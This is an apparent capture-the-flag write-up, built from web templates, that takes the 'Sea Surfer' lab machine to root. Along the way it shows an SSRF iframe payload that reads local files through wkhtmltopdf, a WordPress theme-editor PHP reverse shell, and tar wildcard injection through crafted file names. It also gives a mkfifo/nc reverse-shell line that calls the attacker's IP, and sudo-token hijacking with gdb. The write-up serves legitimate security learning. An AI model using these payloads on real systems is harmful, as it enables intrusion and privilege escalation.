{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Let's begin by scanning all the ports.")}}

{{console("nmap -T5 -p- -sV -sC 10.10.127.240", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 18:27 CET
Nmap scan report for 10.10.127.240
Host is up (0.079s latency).
Not shown: 65374 closed tcp ports (reset), 159 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87:e3:d4:32:cd:51:d2:96:70:ef:5f:48:22:50:ab:67 (RSA)
|   256 27:d1:37:b0:c5:3c:b5:81:6a:7c:36:8a:2b:63:9a:b9 (ECDSA)
|_  256 7f:13:1b:cf:e6:45:51:b9:09:43:9a:23:2f:50:3c:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.99 seconds")}}

{{text("We find 2 open ports.")}}

{{list(['80 (HTTP)', '22 (SSH)'])}}

{{text("We continue by visiting the web page.")}}

{{image("../../static/writeups/seasurfer/images/000001.jpg")}}

{{text("We get met with the default Apache page. I continued by enumerating directories but didn't find anything.")}}

{{text("Then I made a request with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>curl</code> and saw an interesting header.")}}

{{console("curl -i http://10.10.127.240", "HTTP/1.1 200 OK
Date: Fri, 13 Dec 2024 17:41:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: '2aa6-5dcde2b3f2ff9'
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html
...")}}

{{text("There seemed to be a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>seasurfer.thm</code> page. I added that entry to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and proceeded to that address.")}}

{{image("../../static/writeups/seasurfer/images/000002.jpg")}}

{{text("It was a site made on <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>WordPress</code> about a shop for surfers.")}}

{{text("While exploring the page I found that it was made by user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>kyle</code>. I also found an interesting comment on one of the posts.")}}

{{image("../../static/writeups/seasurfer/images/000003.jpg")}}

{{text("This user probably mispelled the URL and it's supposed to be <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>internal.seasurfer.thm</code>. I added that to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file once again and visited it.")}}

{{image("../../static/writeups/seasurfer/images/000004.jpg")}}

{{text("It is a page that generates PDF files based on our input.")}}

{{header("SSRF", "ssrf")}}

{{text("I created a PDF with some test data and downloaded it onto my machine. I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>exiftool</code> in order to find out more about the file.")}}

{{console("exiftool 13122024-BmdQRR38dIBQ2UUycy57.pdf", "ExifTool Version Number         : 13.00
...
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
...")}}

{{text("I noticed that the creator was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wkhtmltopdf 0.12.5</code>. I searched for any exploits for that version.")}}

{{text("All I was able to find was this.")}}

{{link("https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570", "", "SSRF and file read with wkhtmltoimage")}}

{{text("To exploit this, we create a PHP script that redirects to a local file and host it on a PHP server on our machine. Then, using an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>iframe</code> tag, we send a request to the PDF generator, pointing it to our script and specifying the file to read.")}}

{{text("We create the script and host a PHP server.")}}

{{text("In the 'Additional comment' I input a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>iframe</code> tag that will make a request to that file together with the file I want to read.")}}

{{console("<iframe height='2000' width='800' src='http://10.9.1.157:4444/script.php?file=/etc/passwd'></iframe>")}}

{{text("We successfully got a request.")}}

{{image("../../static/writeups/seasurfer/images/000005.jpg")}}

{{text("And we read the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code> file.")}}

{{image("../../static/writeups/seasurfer/images/000006.jpg")}}

{{header("Logging into WordPress", "logging-into-wordpress")}}

{{text("Since the web page used WordPress, I tried finding any admin credentials I could use.")}}

{{text("I was able to find credentials in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/wordpress/wp-config.php</code> file. I used the same method as before to do so.")}}

{{image("../../static/writeups/seasurfer/images/000007.jpg")}}

{{text("Before, when I was looking around the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://seasurfer.thm</code> site, I found a directory <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/adminer</code> but didn't have the neccessary credentials. Since we just extracted them, we can log in.")}}

{{text("We find tables that the WordPress site uses. The most interesting one to us is probably the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wp_users</code> table.")}}

{{image("../../static/writeups/seasurfer/images/000008.jpg")}}

{{text("In it we find user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>kyle</code> and his encrypted password. We save it into a file and use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> to crack it.")}}

{{text("We now can log in to the WordPress admin panel at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/wp-admin</code> using those credentials.")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("We can easily get a reverse shell using the admin panel by uploading a PentestMonkey PHP shell as one of the themes.")}}

{{text("We visit <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copy a PentestMonkey PHP reverse shell.")}}

{{text("We navigate to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Theme File Editor</code> in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Appearance</code> tab.")}}

{{text("We paste our shell into a PHP file, for example <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>404.php</code> and save it.")}}

{{text("Then we navigate to that file and execute it. It's located at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://seasurfer.thm/wp-content/themes/twentyseventeen/404.php</code>.")}}

{{text("If we did everything correctly, we should get a connection.")}}

{{image("../../static/writeups/seasurfer/images/000008.jpg")}}

{{header("Shell as kyle", "shell-as-kyle")}}

{{text("As the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>www-data</code> user, I was able to find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup.sh</code> script at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/internal/maintenance</code>.")}}

{{console("cat backup.sh", "#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *")}}

{{text("I was able to find an article that should help us with privilage escalation.")}}

{{link("https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/", "https://www.hackingarticles.in/wp-includes/images/w-logo-blue-white-bg.png", "Exploiting Wildcard for Privilege Escalation")}}

{{text("If we create a file named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>--checkpoint=1</code> and another named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>--checkpoint-action=exec=sh shell.sh</code>, they will get passed to the command like this.")}}

{{console("", "tar -zcf /home/kyle/backups/invoices.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>*</code> wildcard expands to include all filenames in the directory, and files starting with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>--</code> are interpreted as options by the tar command.")}}

{{text("As a result, <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>--checkpoint=1</code> triggers the checkpoint mechanism immediately, and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>--checkpoint-action=exec=sh shell.sh</code> executes the shell.sh script.")}}

{{text("I got a mkfifo reverse shell and saved it into a file named shell.sh inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/internal/invoices</code> directory.")}}

{{console("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.1.157 1235 >/tmp/f' > shell.sh")}}

{{text("Then I created a file that will execute shell.sh.")}}

{{console("echo '' > '--checkpoint-action=exec=sh shell.sh'")}}

{{text("And the last file.")}}

{{console("echo '' > --checkpoint=1")}}

{{text("Now we set up a listener and should get a reverse shell.")}}

{{image("../../static/writeups/seasurfer/images/000009.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("I ran <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code> on the machine and found out that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ptrace protection</code> is disabled.")}}

{{text("I had no idea what that was and how to exploit it so I started searching and found this.")}}

{{link("https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens", "https://2783428383-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/collections%2FmuMguNrsRx2mNyNqEox4%2Ficon%2F1qCJ0VIDlWcvGSecYCDq%2Ffondo.png?alt=media&token=1e721267-450f-43f3-861b-6c4f93278e93", "Reusing Sudo Tokens")}}

{{text("If we can pass all the requirements we can hijack the session token and escalate our privilages.")}}

{{list(['You already have a shell as user', 'user has used sudo to execute something in the last 15mins', 'cat /proc/sys/kernel/yama/ptrace_scope is 0', 'gdb is accessible'])}}

{{text("The first step was already complete. While using linpeas, I found a command running that was using sudo every 15 minutes so the second step was also complete.")}}

{{text("Third step was also already complete, leaving us with the last one.")}}

{{text("I found and downloaded gdb onto my machine using wget.")}}

{{console("wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb -O gdb.deb")}}

{{text("By hosting a python server, I was able to download the file from my to the victim's machine.")}}

{{text("Now we continue with the article and get the exploit from github page.")}}

{{link("https://github.com/nongiach/sudo_inject", "", "[Linux] Privilege Escalation by injecting process possessing sudo tokens")}}

{{text("For some reason the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>exploit.sh</code> didn't work and I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>exploit_v2.sh</code>.")}}

{{text("I moved the gdb binary to my home folder and added it to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>$PATH</code>. After that I ran the exploit and used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sudo su</code> to become root.")}}

{{script()}}